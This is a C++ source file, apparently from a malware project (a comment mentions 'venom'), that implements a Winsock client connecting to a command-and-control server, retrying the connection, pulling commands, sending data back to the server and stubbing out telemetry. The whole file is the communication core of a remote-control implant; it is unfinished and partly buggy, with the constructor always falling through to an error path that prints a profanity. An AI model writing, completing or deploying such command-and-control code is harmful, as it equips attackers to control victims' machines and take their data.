#include "CommunicationHandler.h"

CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
{
	cncInformation.sin_family = AF_INET;
	cncInformation.sin_port = htons(cncPort);
	inet_pton(AF_INET ,cncIp.c_str(), &cncInformation.sin_addr.S_un.S_addr);

	//Initialize the socket
	if (0 != WSAStartup(dllVersion, &wsaData))
		goto Error;

	connectionSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (connectionSocket == INVALID_SOCKET)
		goto Error;

	Error:
		std::cout << "fuck" << std::endl;
		// Add a kill switch for venom, should be a generic function for all classes in case of a fatal failure
		//WSACleanup();
}

bool CommunicationHandler::Communicator::connectToCnc()
{
	for (int connectionAttemptCount = 0; connectionAttemptCount < MAXIMUM_CONNECTION_ATTEMPTS; connectionAttemptCount++)
	{
		if (0 == connect(connectionSocket, reinterpret_cast<const sockaddr*>(&cncInformation), sizeof(cncInformation)))
		{
			return STATUS_SUCCESS;
		}
	}

	// Add a kiil.
	WSACleanup();
	return STATUS_FAILURE;
}

void CommunicationHandler::Communicator::sendTelemetry()
{
	// Need to implement.
}

bool CommunicationHandler::Communicator::pullCommand(char* buffer, size_t bufferLength)
{
	int resultStatus = 0;

	do {

		resultStatus = recv(connectionSocket, buffer, (int)bufferLength, 0);
		if (resultStatus < 0)
			goto Error;

	} while (resultStatus > 0);

	return STATUS_SUCCESS;

	Error:
		// Add a log message with explenation.
		return STATUS_FAILURE;
}

bool CommunicationHandler::Communicator::sendDataToCnc(const char* buffer)
{
	int resultStatus = 0;

	resultStatus = send(connectionSocket, buffer, (int)strlen(buffer), 0);

	if (resultStatus == SOCKET_ERROR)
		return STATUS_FAILURE;

	return STATUS_SUCCESS;

}

bool CommunicationHandler::Communicator::disconnectFromCnc()
{
	closesocket(connectionSocket);
	connectionSocket = INVALID_SOCKET;
	WSACleanup();

	return STATUS_SUCCESS;
}

CommunicationHandler::Communicator::~Communicator()
{
	WSACleanup();
}